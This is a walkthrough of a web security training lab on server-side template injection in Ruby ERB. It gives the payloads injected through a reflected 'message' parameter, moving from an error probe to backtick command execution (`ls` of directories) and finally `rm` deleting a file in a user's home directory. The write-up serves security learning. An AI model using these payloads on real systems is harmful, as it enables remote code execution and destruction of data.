# Lab: Basic server-side template injection

> Lab Objective: review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

- View Details of a product which is out of stock, then inspect the request:

  - The first request is to get the product with id=1, for instance, it'll will be redirected to another location
    ![1st screenshot](./attachments/1.png)
  - You'll be redirected to request another GET Request with a message as query parameter, this message is reflected within the response body.
    ![2nd screenshot](./attachments/2.png)

- With previously knowing that ERB Template is used, use this payload as the value of the message `<%=foobar%>`, you'll notice that it caused an error.
  ![3rd screenshot](./attachments/3.png)

- You'll be able execute commands on ERB Template using this template `<%= `ls /` %>`, which initially list all directories in home directory.
  ![4th screenshot](./attachments/4.png)

- Traverse to `/home` directory, through this payload `<%= `ls /home/` %>`
  ![5th screenshot](./attachments/5.png)

- Then traverse to `/carlos` home directory, using `<%= `ls /home/carlos` %>`
  ![6th screenshot](./attachments/6.png)

- You'll find a file called `morale.txt`, and the objective is to delete it, therefore use this payload `<%= `rm /home/carlos/morale.txt` %>`
  ![7th screenshot](./attachments/7.png)

- And the lab is solved
  ![8th screenshot](./attachments/8.png)

---
